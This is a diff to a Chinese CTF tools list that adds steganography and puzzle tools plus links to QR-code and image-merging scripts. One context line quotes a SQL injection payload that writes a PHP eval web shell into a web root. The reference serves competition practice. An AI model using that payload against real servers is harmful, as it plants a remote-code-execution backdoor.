@@ -48,6 +48,8 @@
 - Audacity：音频隐写 https://www.audacityteam.org/
 - Mp3Stego：Mp3音频隐写 https://www.petitcolas.net/steganography/mp3stego/
 - Pcap流量包在线修复：http://f00l.de/hacking/pcapfix.php
+- 解决拼图问题：montage+gaps https://github.com/nemanja-m/gaps
+- 在线绘制二维码/汉信码：https://www.pixilart.com/draw?ref=home-page
 
 ### Web
 
@@ -222,3 +224,9 @@ select "<?php @eval($_POST[c]);?>" into outfile "/var/www/html/gopher.php"
 | 搜索文本               | Alt+T  |
 | 搜索十六进制           | Alt+B  |
 
+## Scripts
+
+- 分割图片恢复原图：[image_merge.py](https://github.com/Threekiii/Awesome-CTF/blob/master/scripts/misc/image_merge.py)
+- 二维码010101绘制：
+  - [qrcode_painter_1.py](https://github.com/Threekiii/Awesome-CTF/blob/master/scripts/misc/qrcode_painter_1.py)
+  - [qrcode_painter_2.py](https://github.com/Threekiii/Awesome-CTF/blob/master/scripts/misc/qrcode_painter_2.py)
